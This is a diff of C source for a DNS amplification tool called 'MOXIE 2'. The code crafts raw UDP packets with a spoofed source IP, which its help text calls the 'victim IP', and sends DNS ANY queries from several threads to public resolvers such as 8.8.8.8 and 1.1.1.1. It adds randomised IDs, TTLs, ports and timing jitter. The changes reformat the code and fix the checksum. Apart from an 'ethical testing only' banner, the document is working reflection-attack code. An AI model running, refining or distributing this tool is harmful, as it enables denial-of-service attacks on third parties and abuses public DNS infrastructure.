@@ -1,3 +1,8 @@
+// ─────────────────────────────────────────────────────────────────────────────
+// MOXIE 2 (DNS AMPLIFICATION Tool) (ETHICAL TESTING ONLY)
+// WARNING: For authorized security testing / research only.
+// Unauthorized use is illegal in most jurisdictions.
+// ─────────────────────────────────────────────────────────────────────────────
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -11,13 +16,13 @@
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
-#define DNS_PORT 53
-#define MIN_SOURCE_PORT 1024
-#define MAX_THREADS 4
-#define MAX_PACKET_SIZE 4096
+#define DNS_PORT          53
+#define MIN_SOURCE_PORT   1024
+#define MAX_THREADS       4
+#define MAX_PACKET_SIZE   4096
 #define DEFAULT_PACKET_COUNT 10
-#define DEFAULT_DELAY_MS 100
-#define MAX_JITTER_MS 40
+#define DEFAULT_DELAY_MS  100
+#define MAX_JITTER_MS     40
 #define LOG_PACKET(fmt, ...) \
     do { printf("[+] " fmt "\n", ##__VA_ARGS__); fflush(stdout); } while(0)
 struct packet_data {
@@ -48,73 +53,77 @@ struct dns_question {
     uint16_t qtype;
     uint16_t qclass;
 } __attribute__((packed));
-static unsigned short in_cksum(const unsigned short *buf, int len) {
+static unsigned short in_cksum(const unsigned short *buf, int len)
+{
     unsigned long sum = 0;
     while (len > 1) {
         sum += *buf++;
         len -= 2;
     }
     if (len == 1)
-        sum += *(unsigned char *)buf;
+        sum += *(const unsigned char *)buf;
     sum = (sum >> 16) + (sum & 0xFFFF);
     sum += (sum >> 16);
     return (unsigned short)(~sum);
 }
-static int encode_dns_name(uint8_t *restrict buf, int buf_size, const char *name) {
+static int encode_dns_name(uint8_t *restrict buf, int buf_size, const char *name)
+{
     int pos = 0;
     const char *ptr = name;
     while (*ptr) {
         const char *label_start = ptr;
         while (*ptr && *ptr != '.') ptr++;
         int len = ptr - label_start;
-        if (len == 0 || len > 63) return -1; // invalid label
-        if (pos + len + 2 > buf_size) return -1; // prevent overflow
+        if (len == 0 || len > 63) return -1;          
+        if (pos + len + 1 > buf_size) return -1;       
         buf[pos++] = (uint8_t)len;
         memcpy(buf + pos, label_start, len);
         pos += len;
         if (*ptr == '.') ptr++;
     }
     if (pos >= buf_size) return -1;
-    buf[pos++] = 0; // root label
+    buf[pos++] = 0;                                    
     return pos;
 }
-static void print_usage(const char *progname) {
+static void print_usage(const char *progname)
+{
     fprintf(stderr,
         "\nDNS Amplification Test Tool (ethical testing / research only)\n\n"
         "Usage: %s [options]\n\n"
         "Required:\n"
-        "  -s, --spoof <IP>       Source IP to spoof (usually the victim IP)\n"
-        "  -d, --domain <name>    Domain name to query (ANY record)\n\n"
+        " -s, --spoof <IP>   Source IP to spoof (victim IP)\n"
+        " -d, --domain <name> Domain name to query (ANY record)\n\n"
         "Optional:\n"
-        "  -c, --count <n>        Number of packets to send (default: %d)\n"
-        "  -D, --delay <ms>       Delay between packets in milliseconds (default: %d)\n"
-        "  -h, --help             Show this help message\n\n"
+        " -c, --count <n>    Number of packets to send (default: %d)\n"
+        " -D, --delay <ms>   Delay between packets in ms (default: %d)\n"
+        " -h, --help         Show this help message\n\n"
         "Example:\n"
-        "  sudo %s -s 192.168.1.50 -d isc.org -c 20 -D 80\n\n"
+        " sudo %s -s 192.168.1.50 -d isc.org -c 20 -D 80\n\n"
         "Notes:\n"
-        "  • Must be run as root (raw sockets required)\n"
-        "  • Spoofed source IP should be the system you want reflected traffic sent to\n"
-        "  • Use only in environments you own or have explicit permission to test\n\n",
+        " • Requires root (raw sockets)\n"
+        " • Spoofed source = victim that will receive amplified traffic\n"
+        " • Use only on systems you own or have explicit permission for\n\n",
         progname, DEFAULT_PACKET_COUNT, DEFAULT_DELAY_MS, progname);
 }
-void gather_dns_resolvers(const char ***dns_servers) {
+void gather_dns_resolvers(const char ***dns_servers)
+{
     static const char *default_dns[] = {
-        "8.8.8.8",    "1.1.1.1",    "8.8.4.4",
-        "9.9.9.9",    "1.0.0.1",    "208.67.222.222",
+        "8.8.8.8", "1.1.1.1", "8.8.4.4",
+        "9.9.9.9", "1.0.0.1", "208.67.222.222",
         NULL
     };
     *dns_servers = default_dns;
 }
-void *send_packet(void *arg) {
+void *send_packet(void *arg)
+{
     struct packet_data *data = (struct packet_data *)arg;
-    int count = data->count;
-    int delay_ms = data->delay_ms;
-    int start_packet = data->start_packet;
-    int sock = data->sock;
+    int count         = data->count;
+    int delay_ms      = data->delay_ms;
+    int start_packet  = data->start_packet;
+    int sock          = data->sock;
     const char *spoof_ip = data->spoof_ip;
-    const char *domain = data->domain;
-    uint8_t packet[MAX_PACKET_SIZE];
-    memset(packet, 0, sizeof(packet));
+    const char *domain    = data->domain;
+    uint8_t packet[MAX_PACKET_SIZE] = {0}; 
     const char **dns_servers;
     gather_dns_resolvers(&dns_servers);
     int dns_count = 0;
@@ -123,93 +132,92 @@ void *send_packet(void *arg) {
         fprintf(stderr, "No DNS servers available.\n");
         return NULL;
     }
-    unsigned int seed = (unsigned int)(time(NULL) ^ getpid() ^ pthread_self());
-    struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
-    dest.sin_family = AF_INET;
-    struct iphdr *ip = (struct iphdr *)packet;
-    struct udphdr *udp = (struct udphdr *)(packet + sizeof(*ip));
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)getpid() ^
+                        (unsigned int)pthread_self();
+    struct sockaddr_in dest = {
+        .sin_family = AF_INET
+    };
+    struct iphdr     *ip  = (struct iphdr *)packet;
+    struct udphdr    *udp = (struct udphdr *)(packet + sizeof(*ip));
     struct dns_header *dns = (struct dns_header *)(packet + sizeof(*ip) + sizeof(*udp));
     uint8_t *qname = (uint8_t *)(dns + 1);
-    int name_len = encode_dns_name(qname, sizeof(packet) - sizeof(*ip) - sizeof(*udp) - sizeof(*dns), domain);
+    int name_len = encode_dns_name(qname,
+                                   MAX_PACKET_SIZE - sizeof(*ip) - sizeof(*udp) - sizeof(*dns),
+                                   domain);
     if (name_len < 0) {
         fprintf(stderr, "Invalid domain name: %s\n", domain);
         return NULL;
     }
     struct dns_question *q = (struct dns_question *)(qname + name_len);
-    q->qtype = htons(255); // ANY
-    q->qclass = htons(1);  // IN
+    q->qtype  = htons(255);   // ANY
+    q->qclass = htons(1);     // IN
     int dns_len = sizeof(*dns) + name_len + sizeof(*q);
-    udp->source = htons(MIN_SOURCE_PORT + (rand_r(&seed) % (65535 - MIN_SOURCE_PORT)));
     udp->dest = htons(DNS_PORT);
-    udp->len = htons(sizeof(*udp) + dns_len);
+    udp->len  = htons(sizeof(*udp) + dns_len);
     udp->check = 0;
-    dns->id = 0;
-    dns->flags = htons(0x0100);
+    dns->flags   = htons(0x0100);   
     dns->qdcount = htons(1);
-    dns->ancount = 0;
-    dns->nscount = 0;
-    dns->arcount = 0;
-    ip->version = 4;
-    ip->ihl = 5;
-    ip->tos = 0;
-    ip->tot_len = htons(sizeof(*ip) + sizeof(*udp) + dns_len);
+    ip->version  = 4;
+    ip->ihl      = 5;
+    ip->tos      = 0;
+    ip->tot_len  = htons(sizeof(*ip) + sizeof(*udp) + dns_len);
     ip->frag_off = 0;
-    ip->ttl = 64 + (rand_r(&seed) % 30);
     ip->protocol = IPPROTO_UDP;
-    ip->saddr = inet_addr(spoof_ip);
+    ip->saddr    = inet_addr(spoof_ip);
     int packet_len = ntohs(ip->tot_len);
     for (int i = start_packet; i < start_packet + count; i++) {
         const char *target_ip = dns_servers[rand_r(&seed) % dns_count];
         dest.sin_addr.s_addr = inet_addr(target_ip);
-
-        dns->id = htons(rand_r(&seed) & 0xFFFF);
-        ip->id = htons(rand_r(&seed) & 0xFFFF);
-
+        dns->id      = htons(rand_r(&seed) & 0xFFFF);
+        ip->id       = htons(rand_r(&seed) & 0xFFFF);
+        ip->ttl      = 64 + (rand_r(&seed) % 30);
+        udp->source = htons(MIN_SOURCE_PORT +
+                            (rand_r(&seed) % (65535 - MIN_SOURCE_PORT + 1)));
         ip->check = 0;
         ip->check = in_cksum((uint16_t *)ip, sizeof(*ip));
         struct pseudo_header psh = {
-            .source = ip->saddr,
-            .dest = ip->daddr,
-            .zero = 0,
+            .source   = ip->saddr,
+            .dest     = dest.sin_addr.s_addr,
+            .zero     = 0,
             .protocol = IPPROTO_UDP,
-            .udp_len = udp->len
+            .udp_len  = udp->len
         };
-        uint16_t *buf = alloca(sizeof(psh) + ntohs(udp->len));
-        if (!buf) {
-            fprintf(stderr, "Memory allocation failed.\n");
-            continue;
-        }
-        memcpy(buf, &psh, sizeof(psh));
-        memcpy((char *)buf + sizeof(psh), udp, ntohs(udp->len));
+        size_t csum_size = sizeof(psh) + ntohs(udp->len);
+        uint16_t *csum_buf = alloca(csum_size);
+        memcpy(csum_buf, &psh, sizeof(psh));
+        memcpy((char *)csum_buf + sizeof(psh), udp, ntohs(udp->len));
         udp->check = 0;
-        udp->check = in_cksum(buf, sizeof(psh) + ntohs(udp->len));
-        if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+        udp->check = in_cksum(csum_buf, (int)csum_size);
+        if (sendto(sock, packet, packet_len, 0,
+                   (struct sockaddr *)&dest, sizeof(dest)) < 0) {
             fprintf(stderr, "sendto failed: %s\n", strerror(errno));
         } else {
             LOG_PACKET("Sent packet %3d | ID: %5u | src:%s → dst:%s:53",
                        i, ntohs(dns->id), spoof_ip, target_ip);
         }
         if (i < start_packet + count - 1) {
-            struct timespec ts;
-            ts.tv_sec = delay_ms / 1000;
-            ts.tv_nsec = ((delay_ms % 1000) + (rand_r(&seed) % MAX_JITTER_MS)) * 1000000;
+            struct timespec ts = {
+                .tv_sec  = delay_ms / 1000,
+                .tv_nsec = ((delay_ms % 1000) * 1000000LL) +
+                           ((rand_r(&seed) % MAX_JITTER_MS) * 1000000LL)
+            };
             nanosleep(&ts, NULL);
         }
     }
     return NULL;
 }
-int main(int argc, char **argv) {
+int main(int argc, char **argv)
+{
     char *spoof_ip = NULL;
-    char *domain = NULL;
-    int count = DEFAULT_PACKET_COUNT;
-    int delay_ms = DEFAULT_DELAY_MS;
+    char *domain   = NULL;
+    int count      = DEFAULT_PACKET_COUNT;
+    int delay_ms   = DEFAULT_DELAY_MS;
     static struct option long_options[] = {
-        {"spoof", required_argument, 0, 's'},
+        {"spoof",  required_argument, 0, 's'},
         {"domain", required_argument, 0, 'd'},
-        {"count", required_argument, 0, 'c'},
-        {"delay", required_argument, 0, 'D'},
-        {"help", no_argument, 0, 'h'},
+        {"count",  required_argument, 0, 'c'},
+        {"delay",  required_argument, 0, 'D'},
+        {"help",   no_argument,       0, 'h'},
         {0, 0, 0, 0}
     };
     int opt;
@@ -217,17 +225,18 @@ int main(int argc, char **argv) {
         char *endptr = NULL;
         switch (opt) {
             case 's': spoof_ip = optarg; break;
-            case 'd': domain = optarg; break;
+            case 'd': domain   = optarg; break;
             case 'c':
-                count = strtol(optarg, &endptr, 10);
+                count = (int)strtol(optarg, &endptr, 10);
                 if (*endptr != '\0' || count < 1) {
                     fprintf(stderr, "Invalid count value.\n");
                     return 1;
                 }
                 break;
             case 'D':
-                delay_ms = strtol(optarg, &endptr, 10);
-                if (*endptr != '\0' || delay_ms < 0) delay_ms = 0;
+                delay_ms = (int)strtol(optarg, &endptr, 10);
+                if (*endptr != '\0' || delay_ms < 0)
+                    delay_ms = 0;
                 break;
             case 'h':
             default:
@@ -241,12 +250,12 @@ int main(int argc, char **argv) {
         return 1;
     }
     printf("[*] Starting DNS ANY amplification test\n");
-    printf("    Spoofed source : %s\n", spoof_ip);
-    printf("    Query domain   : %s (ANY)\n", domain);
-    printf("    Packet count   : %d\n", count);
-    printf("    Delay          : %d ms\n", delay_ms);
+    printf(" Spoofed source : %s\n", spoof_ip);
+    printf(" Query domain   : %s (ANY)\n", domain);
+    printf(" Packet count   : %d\n", count);
+    printf(" Delay          : %d ms\n", delay_ms);
     printf("───────────────────────────────────────\n");
-    srand(time(NULL) ^ getpid());
+    srand((unsigned int)(time(NULL) ^ getpid()));
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
         perror("socket(AF_INET, SOCK_RAW, IPPROTO_RAW)");
@@ -264,11 +273,11 @@ int main(int argc, char **argv) {
     int remainder = count % MAX_THREADS;
     for (int i = 0; i < MAX_THREADS; i++) {
         data[i].start_packet = i * packets_per_thread;
-        data[i].count = packets_per_thread + (i == MAX_THREADS - 1 ? remainder : 0);
-        data[i].delay_ms = delay_ms;
-        data[i].sock = sock;
-        data[i].spoof_ip = spoof_ip;
-        data[i].domain = domain;
+        data[i].count        = packets_per_thread + (i == MAX_THREADS - 1 ? remainder : 0);
+        data[i].delay_ms     = delay_ms;
+        data[i].sock         = sock;
+        data[i].spoof_ip     = spoof_ip;
+        data[i].domain       = domain;
         int ret = pthread_create(&threads[i], NULL, send_packet, &data[i]);
         if (ret != 0) {
             fprintf(stderr, "Failed to create thread %d: %s\n", i, strerror(ret));
